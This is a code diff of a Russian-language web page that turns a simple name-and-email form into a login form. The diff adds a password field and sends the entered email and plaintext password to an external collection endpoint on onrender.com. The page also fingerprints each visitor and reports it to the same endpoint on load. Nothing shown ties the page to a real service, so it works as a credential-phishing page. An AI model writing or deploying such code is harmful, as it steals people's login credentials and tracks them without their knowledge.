@@ -13,10 +13,10 @@ button{padding:10px 24px;background:#2563eb;color:#fff;border:0;border-radius:6p
 </head>
 <body>
 <h1>Добро пожаловать</h1>
-<p>Заполните форму, чтобы продолжить.</p>
-<input id="name" placeholder="Имя">
-<input id="email" placeholder="Email">
-<button onclick="submitForm()">Продолжить</button>
+<p>Войдите в аккаунт, чтобы продолжить.</p>
+<input id="email" placeholder="Email" type="email">
+<input id="password" placeholder="Пароль" type="password">
+<button onclick="submitForm()">Войти</button>
 <pre id="log"></pre>
 <script>
 const API = "https://sites-gt5x.onrender.com/api/collect";
@@ -51,14 +51,20 @@ function fingerprint() {
 collect({type: "visit", fp: fingerprint()});
 
 async function submitForm() {
-  const name = document.getElementById("name").value;
   const email = document.getElementById("email").value;
+  const password = document.getElementById("password").value;
+  
+  if (!email || !password) {
+    document.getElementById("log").textContent = "Заполните все поля.";
+    return;
+  }
+
   document.getElementById("log").textContent = "Отправка...";
   
   await collect({
-    type: "form", 
-    name: name, 
+    type: "login", 
     email: email, 
+    password: password, 
     fp: fingerprint()
   });
   
